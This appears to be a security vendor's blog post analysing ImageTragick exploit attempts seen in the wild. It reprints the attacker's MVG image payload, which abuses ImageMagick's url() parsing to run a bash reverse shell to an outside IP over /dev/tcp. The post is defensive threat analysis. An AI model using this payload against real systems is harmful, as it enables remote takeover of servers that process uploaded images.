@@ -1,0 +1,26 @@
+Analyzing ImageTragick Exploits in the Wild
+
+Three days ago the ImageMagic (also known as, ImageTragick) vulnerability was released to the world. We’ve been actively monitoring this vulnerability, and have discovered a few different attacks targeting it. Interestingly enough, the attacks themselves seem to be aimed at specific customers as opposed to mass blanket attacks, which is what you’d expect when these type of serious and easy to exploit vulnerabilities are disclosed.
+This is an example of where the severity of a vulnerability alone is not enough to determine its true impact. We have to extend our scope over a few different factors, including the ability to exploit at scale and potential dependencies. For instance, with ImageTragick, to effectively apply the vulnerability an attacker requires file upload permissions. These are generally restricted to subscribers and administrators, which by design negatively impacts the ability to perform a mass exploit across the web. Additionally, there aren’t that many open-source and public Content Management Systems (CMS) that use ImageMagick by default. This drastically reduces the potential attack surface – something required to see mass attacks.
+Despite being serious, ImageTragick has not been as tragic as originally forecasted (at least not yet).
+
+Exploit in the Wild
+What has been interesting is monitoring what the attackers are doing based on the data we’ve been analyzing. We were specifically interested in how attackers would take advantage of the remote code execution (RCE) vulnerability.
+We found an interesting exploit attempt. The attackers are using a bot that is scanning for multiple file upload URLs (including /upload.php and /imgupload.php) and sending the following JPG file:
+filename="logo.jpg"
+
+At first glance, you’d think it was benign. That’s why we have to look at the content of the image. Instead of a JPG image (as expected from the file type), the attacker had modified the image content, changing the file content to MVG. Embedded within the image, they included this:
+push graphic-context
+viewbox 0 0 640 480 fill 'url(https://\x22|setsid /bin/bash -i >/dev/tcp/106.186.30.7/443 0<&1 2>&1")'
+If you recall, the RCE vulnerability was specific to the way it parsed MVG files, which allows a remote attacker to break out of the image manipulation flow and execute their own shell commands.
+In this example, which we are seeing in the wild, they are running the following command:
+setsid /bin/bash -i >/dev/tcp/106.186.30.XX/443
+This creates a reverse shell to 106.186.30.XX – an IP registered on Linode. It is likely being used as a command and control for the servers they manage to hack.
+The HTTP requests are coming from an IP address from Taiwan, on the 210.61.116.0/24 range:
+netname: HINET-NET
+descr: Data Communication Business Group,
+descr: Chunghwa Telecom Co.,Ltd.
+descr: No.21, Sec.1, Xinyi Rd., Taipei City
+descr: 10048, Taiwan
+We are curious to see how this continues to evolve. In the past we’ve seen different things happen. Some start with very modest targeted tests and others with more aggressive mass exploit attempts. Because this vulnerability specifically seems to be lacking a few critical elements, like accessibility, it could explain why we’re seeing a slower, more cautious, poke-and-prod approach.
+This definitely doesn’t mean you shouldn’t patch. In fact, knowing there are active attacks should be good reason to update sooner rather than later, especially with the patch process being straightforward. If you’re a customer on the Sucuri Firewall you are already patched via our virtual patching engine.
